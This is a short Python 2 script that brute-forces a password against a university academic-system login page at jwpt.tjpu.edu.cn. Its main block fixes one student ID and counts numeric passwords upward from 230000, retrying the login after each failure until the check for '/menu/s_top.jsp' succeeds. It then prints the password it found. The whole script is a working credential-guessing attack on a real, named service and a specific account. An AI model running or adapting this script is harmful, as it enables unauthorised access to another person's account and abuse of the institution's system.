#! /usr/bin/env python
#coding:utf-8

import urllib2
import urllib
import cookielib
import time

start_all = time.time()

loginurl = 'http://jwpt.tjpu.edu.cn:8081/loginAction.do'
logindomain = 'renren.com'
 
class Login(object):
    def __init__(self):
        self.name = ''
        self.passwprd = ''
 
        self.cj = cookielib.LWPCookieJar()            
        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj)) 
        urllib2.install_opener(self.opener)
        
        self.headers = {'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0',  
                   'Referer' : 'http://jwpt.tjpu.edu.cn:8081/logout.do'}    
        
     
    def setLoginInfo(self, username, password):
        self.name = username
        self.pwd = password
 
    def login(self):
        start_1 = time.time()
        loginparams = {'zjh':self.name, 'mm':self.pwd}
        req = urllib2.Request(loginurl, urllib.urlencode(loginparams), headers=self.headers)  
        ''' optimize this code '''
        resp = urllib2.urlopen(req)
        print "time_3", time.time() - start_1
        #self.operate = self.opener.open(req)
        #print "time_4", time.time() - start_1
        result = resp.read()
    
        print len(result)
        
        if '/menu/s_top.jsp' in result:
            flag_login = True
        else:
            flag_login = False
        
        print "time_1", time.time() - start_1
        print 
        return flag_login  
         
if __name__ == '__main__':
    userlogin = Login()
    name = 1111611310
    passwd = 230000
    userlogin.setLoginInfo(name,passwd)
    login_result = userlogin.login()
    
    while not userlogin.login():
        print "%s is not right"%passwd
        passwd += 1;
        userlogin.setLoginInfo(name,passwd)
        
        
    print 'find it %s'%passwd
    print "time_sum", time.time() - start_all
    
    

    